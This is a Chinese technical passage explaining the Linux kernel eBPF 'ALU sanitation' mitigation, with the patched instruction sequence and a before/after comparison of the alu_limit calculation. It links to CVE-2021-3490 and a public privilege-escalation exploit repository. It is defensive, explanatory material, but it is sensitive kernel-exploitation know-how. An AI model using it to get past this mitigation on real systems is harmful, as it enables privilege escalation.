**原理**：`ALU sanitation`机制一直在进行更新，其目的是为了阻止`verifier`漏洞的利用，原理是在runtime运行时检查BPF指令的操作数，防止指针运算越界导致越界读写，其实是对`verifier`静态范围检查起到了补充的作用。

如果某条ALU运算指令的操作数是1个指针和1个标量，则计算`alu_limit` 也即最大绝对值，就是该指针可以进行加减的安全范围。在该指令之前必须加上如下指令，`off_reg`表示与指针作运算的标量寄存器，`BPF_REG_AX`是辅助寄存器。
- （1）将`alu_limit`载入`BPF_REG_AX`。
- （2）`BPF_REG_AX = alu_limit - off_reg`，如果 `off_reg &gt; alu_limit`，则`BPF_REG_AX`最高位符号位置位。
- （3）若`BPF_REG_AUX`为正，`off_reg`为负，则表示`alu_limit`和寄存器的值符号相反，则`BPF_OR`操作会设置该符号位。
- （4）`BPF_NEG`会使符号位置反，1-&gt;0，0-&gt;1。
- （5）`BPF_ARSH`算术右移63位，`BPF_REG_AX`只剩符号位。
- （6）根据以上运算结果，`BPF_AND`要么清零`off_reg`要么使其不变。
总体看来，如果`off_reg &gt; alu_limit` 或者二者符号相反，表示有可能发生指针越界，则`off_reg`会被替换为0，清空指针运算。反之，如果标量在合理范围内—`0 &lt;= off_reg &lt;= alu_limit`，则算术移位会将`BPF_REG_AX`填为1，这样`BPF_AND`运算不会改变该标量。

```
*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);
*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);
```

**最近更新**：最近更新了`alu_limit`的计算方法，见[commit 7fedb63a8307d](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0)，这里我们对比一下更新前后的计算差异。
- 之前：`alu_limit`由指针寄存器的边界确定，如果指针指向map的开头，则`alu_limit`可减的大小为0，可加的大小为 `map size-1`，并且`alu_limit`随着接下来的指针运算而更新。
- 现在：`alu_limit`由`offset`寄存器的边界来确定，将运行时offset寄存器的值与`verifier`静态范围追踪时计算出来的边界进行比较。
## 参考

[Kernel Pwning with eBPF: a Love Story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)

[https://nvd.nist.gov/vuln/detail/CVE-2021-3490](https://nvd.nist.gov/vuln/detail/CVE-2021-3490)

[https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490](https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490)
